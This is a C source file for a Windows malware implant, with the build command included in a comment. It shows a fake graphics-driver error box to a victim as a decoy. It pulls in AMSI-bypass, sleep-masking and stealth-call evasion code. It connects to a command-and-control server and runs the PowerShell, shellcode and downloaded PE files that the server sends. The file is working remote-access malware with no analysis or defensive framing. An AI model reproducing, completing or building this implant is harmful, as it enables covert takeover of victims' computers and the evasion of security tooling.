#include "helper.h" //has all the includes

#include "Attacks/ExecutePowershell.h"
#include "Attacks/ExecuteShellcode.h"
#include "Attacks/ExecutePELoader.h"

#include "Lib/StealthCall.h"
#include "Lib/SleepMasking.h"
#include "Lib/Wrappers.h"
#include "Lib/AMSIBypass.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

/*
	nasm -f win64 .\Lib\StealthCall.asm -o .\Lib\StealthCall.o ; gcc -s -fmerge-all-constants .\implant.c .\helper.c .\Attacks\*.c .\Lib\*.c .\Lib\*.o -lwininet -lws2_32 -ladvapi32 -lntdll -o implant.exe
*/

int main() {
    MessageBoxA(NULL, "Error 0x41da0: Graphic driver not reconized, your computer may be not compatible with this version of the utility.", "[0x41da0] Windows System Error", MB_ICONERROR);
    GoDark(7000);
    SOCKET c2Socket;
    PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
    BOOL loop = 1;
    SIZE_T pe_sz = 0;
    PBYTE pe;
    SetupConstants();

    ConnectToC2(&c2Socket);
    GoDark(5000);
    while(loop) {
        recvC2Packet(&c2Socket, pkt);
        GoDark(5000);
        switch(pkt->CmdId) {
            case 0x1:
                printf("[C2] Received command ID 1 for {executePowershell}\n");
                ExecPowerShell((LPCWSTR)pkt->Data);
                break;
            case 0x2:
                printf("[C2] Received command ID 2 for {executeShellCode}\n");
                ExecShellcode(pkt->Data);
                break;
            case 0x3: // PE Load initiated
                printf("[C2] Received command ID 3 for {GetPEFromC2}\n");
                PBYTE pe = GetPEFromC2(&c2Socket, pkt); 
                
                if (pe) {
                    printf("[*] Running PE Loader...\n");
                    ExecutePELoader(pe); 
                }
                break;
            case 0x10 :
                printf("[C2] Starting self-destruct !");
                loop = 0;
                break;
            default :
                printf("[-] Undefined command received, ignored...\n");
                printf("[DEBUG] Hexdump :\n");
                hexdump((BYTE*)pkt, sizeof(C2_PACKET));
                printf("[END DEBUG]\n");
                loop = 0;
                break;
        }
        GoDark(15000);
    }
cleanup: 
    if(pe) VirtualFree(pe, 0, MEM_RELEASE);
    if(pkt) VirtualFree(pkt, 0, MEM_RELEASE);

    return 0;
}